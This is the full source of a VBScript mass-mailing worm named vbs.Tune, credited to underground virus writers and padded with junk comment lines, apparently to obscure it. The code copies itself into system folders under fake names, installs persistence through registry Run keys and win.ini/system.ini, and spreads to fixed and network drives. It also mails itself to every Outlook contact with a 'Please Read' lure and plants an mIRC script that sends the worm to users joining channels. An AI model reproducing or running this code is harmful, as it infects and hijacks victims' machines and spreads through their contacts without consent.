'~vbs.Tune (with exe method) by sevenC / N0:7
'~http://trax.to/sevenC/
'~mailto:sevenC_zone@yahoo.com
'sectors underground team
'~real VBS.tune by slug
'MZ           œ~Ÿÿ…š1Åyºí0¼    
'bÂUé©gr@? œ~Ÿÿ…š1Åyºí0¼    
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W     œúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W     œúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
sub Tune()
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
On Error Resume Next
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
Dim obj, sysfldr,s, f
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
Set obj = CreateObject("Scripting.FileSystemObject")
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Set sysfldr = obj.GetSpecialFolder(1)
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Set winfldr = obj.GetSpecialFolder(0)
Set tmpfldr = obj.GetSpecialFolder(2)
set s = CreateObject("Scripting.FileSystemObject")
Set f = s.GetFile(WScript.ScriptFullName)
'ßÌc        a !W     œúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
f.copy(sysfldr&"\tune.vbs")
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
f.copy(winfldr&"\tune.vbs")
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
f.copy(tmpfldr&"\tune.vbs")
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
f.copy(sysfldr&"\kernel.vbs")
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W f.copy(winfldr&"\winsck.vbs")
f.copy(sysfldr&"\explorer.vbs")
'ßÌc        a !W     œúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
loc=winfldr&"\tune.vbs"
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
loc1=sysfldr&"\tune.vbs"

'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W loc2=tmpfldr&"\tune.vbs"
loc3=sysfldr&"\kernel.vbs"
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
loc4=winfldr&"\winsck.vbs"
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
loc5="explorer.vbs"
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
'ßÌc        a !W     œúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Set WSHShell = CreateObject("WScript.Shell")
'ßÌc        a !W 
'ßÌc        a !W 
WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ScanRegistry", loc
WSHShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\", loc1
WSHShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\", loc2
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
editini winfldr&"\win.ini","[windows]","load",loc3
editini winfldr&"\win.ini","[windows]","run",loc4
editini winfldr&"\system.ini","[boot]","shell","Explorer.exe " & loc5
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
ntwrk()
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
end sub
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
sub infect(drive)
On Error Resume Next
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
set s = CreateObject("Scripting.FileSystemObject")
Set f = s.GetFile(WScript.ScriptFullName)
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
f.copy(drive & "\tune.vbs")
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
path=drive&"\tune.vbs"
end sub
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Function ShowDriveType(drvpath)
'ßÌc        a !W     œúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
On Error Resume Next
'ßÌc        a !W     œúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Dim fso, d, t
'ßÌc        a !W     œúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌc        a !W     œúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Set fso = CreateObject("Scripting.FileSystemObject")
'ßÌc        a !W     œúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Set d = fso.GetDrive(drvpath)
'ßÌc        a !W     œúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Select Case d.DriveType
'ßÌc        a !W     œúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Case 0: t = "Unknown"
Case 1: t = "Removable"
Case 2: t = "Fixed"
Case 3: t = "Network"
Case 4: t = "CD-ROM"
Case 5: t = "RAM Disk"
'ßÌc        a !W     œúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
End Select
'ßÌc        a !W     œúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
if t = "" then t = "None"
ShowDriveType = t
End Function
'ßÌc        a !W     œúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
sub ntwrk()
On Error Resume Next
'ßÌc        a !W     œúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌc        a !W     œúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
for n = 65 to 90
l=Chr(n)
drv=l&":"
d3=ShowDriveType(drv)
if d3 = "Fixed" then infect(drv)
if d3 = "Network" then infect(drv)
next
'ßÌc        a !W     œúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌc        a !W     œúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
sprd()
'ßÌc        a !W     œúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
end sub
'ßÌc        a !W     œúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
sub sprd()
on error resume next
'ßÌc        a !W 
Dim oShell
'ßÌc        a !W 
Set oShell = Wscript.CreateObject("Wscript.Shell")
'ßÌc        a !W 
Dim strProfile
'ßÌc        a !W 
Dim strAlias, strAliasKey
'ßÌc        a !W 
strProfile =
oShell.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Sent?")
if strProfile = "" then
oShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Sent?", "1"
Set Prg = CreateObject("Outlook.Application")
Set Prg1 = Prg.GetNameSpace("MAPI")
For y = 1 To Prg1.AddressLists.Count
Set AdBook = Prg1.AddressLists(y)
x = 1
Set Maie = Prg.CreateItem(0)
For oo = 1 To AdBook.AddressEntries.Count
newmailadd = AdBook.AddressEntries(x)
Maie.Recipients.Add newmailadd
x = x + 1
Next
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Maie.Subject = "Please Read"
Maie.Body = "Hey, you really need to check out this attached file I sent you...please check it out as soon as possible."
Maie.Attachments.Add WScript.ScriptFullName
Maie.DeleteAfterSubmit = False
Maie.Send
newmailadd=""
next
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
else
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
end if
etc()
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
end sub
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
sub etc()
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
On Error Resume Next
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
a=ReportFolderStatus("C:\mirc")
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
if a="1" then mirc()
b=ReportFolderStatus("C:\pirch98")
if b="1" then pirch9x()
end sub
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Tune()
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Function ReportFileStatus(filespec)
On Error Resume Next
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Dim fso, msg
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Set fso = CreateObject("Scripting.FileSystemObject")
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
If (fso.FileExists(filespec)) Then
msg = "1"
Else
msg = "0"
End If
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
ReportFileStatus = msg
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
End Function
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Function ReportFolderStatus(fldr)
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
On Error Resume Next
Dim fso, msg
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Set fso = CreateObject("Scripting.FileSystemObject")
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
If (fso.FolderExists(fldr)) Then
msg = "1"
Else
msg = "0"
End If
ReportFolderStatus = msg
End Function
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
sub mirc()
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
On Error Resume Next
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Dim fso4, folder
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Set fso4 = CreateObject("Scripting.FileSystemObject")
Set winfolder = fso4.GetSpecialFolder(1)
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
path = winfolder&"\tune.vbs"
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Dim fso34, f132, t2s
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Const ForWriting = 2
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Set fso34 = CreateObject("Scripting.FileSystemObject")
fso34.CreateTextFile ("c:\mirc\script.ini")
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Set f132 = fso34.GetFile("c:\mirc\script.ini")
Set t2s = f132.OpenAsTextStream(ForWriting, false)
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
t2s.write "[script]" & vbcrlf
t2s.write "n0=ON 1:JOIN:#:/dcc send $nick " & path & vbcrlf
t2s.close
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
